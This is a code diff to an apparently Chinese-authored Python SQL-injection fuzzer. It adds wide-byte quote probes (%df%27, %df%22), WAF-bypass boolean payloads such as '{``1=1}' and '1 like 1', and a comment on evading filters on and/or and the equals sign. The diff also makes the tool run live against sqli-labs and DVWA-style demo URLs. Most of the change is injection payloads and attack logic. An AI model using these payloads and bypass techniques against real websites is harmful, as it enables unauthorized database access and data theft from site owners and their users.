@@ -16,19 +16,20 @@ class Fuzz:
         self.params = urlparse(self.url).query                  # 获取url链接的参数
         self.paramsList = self.params.split('&')                # 将字符串型的参数改为以&分割的列表
 
-        # 单引号，双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
-        self.test = ["'", '"', '\\', '/***/or', '/***/xor', '@', '%', '$', '^', '!', '[']
+        # 单引号，双引号，宽字节+单引号，宽字节+双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
+        self.test = ["'", '"', '%df%27', '%df%22', '\\', '/***/or', '/***/xor', '@', '%', '$', '^', '!', '[']
         # 注释符 '--+', '-- ', '%23'
         self.Notes = [' ', '--+', '%23']
         # 单引号，双引号，括号  quotes:引号 brackets:括号
         self.quotes_brackets = ["\\", "'", '"', "')", '")']
 
         # digit_bypass可过数字型注入的waf
+        # and和or有可能不能使用，或者可以试下&&和||能不能用；还有=不能使用的情况，可以考虑尝试<、>，因为如果不小于又不大于，那边是等于了
         # self.digit_bypass = [['1', '0'], ['1-0', '1-1'], ['1+0', '1+1'], ['1*0', '1*1'], ['2/1', '0/1'],
         #                 ['2<<1', '0<<2'], ['2>>1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
         #                 ['1&&1', '0&&1'], ['1^1', '1^0'], ['1%3', '3%3']]
         # 精简版：↓
-        self.digit_bypass = [['1', '0'], ['2<<1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
+        self.digit_bypass = [['{``1=1}', '{``1=2}'], ['1 like 1', '1 like 2'], ['1', '0'], ['2<<1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
                              ['1&&1', '0&&1'], ['1^1', '1^0']]
 
         self.nums = len(self.paramsList) * len(self.test) + len(self.paramsList) * len(self.quotes_brackets) * len(self.Notes) + len(self.paramsList) * len(self.digit_bypass)  # 计算共请求次数
@@ -190,7 +191,7 @@ class Fuzz:
                     self.num += 1
 
     def attack(self):
-        self.test_sql()
+        #self.test_sql()
         self.req_digit_payload()
         self.req_char_payload()
         return self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads
@@ -201,6 +202,7 @@ class Fuzz:
 # cookies = 'PHPSESSID=mfo83ugq1km65d6oa2bb0fds43; security=low'
 # url1 = "http://demo.dvwa.com/vulnerabilities/sqli/?id=1&Submit=Submit#"
 
-# cookies = None
-# url1 = 'http://demo.sqli.com/Less-2/?id=1&c=2'
-# Fuzz(url1, cookies).attack()
+cookies = None
+#url1 = 'http://lrzdjx.com/sqli/Less-1/?id=1'
+url1 = 'http://demo.sqli.com/Less-2/?id=1'
+Fuzz(url1, cookies).attack()
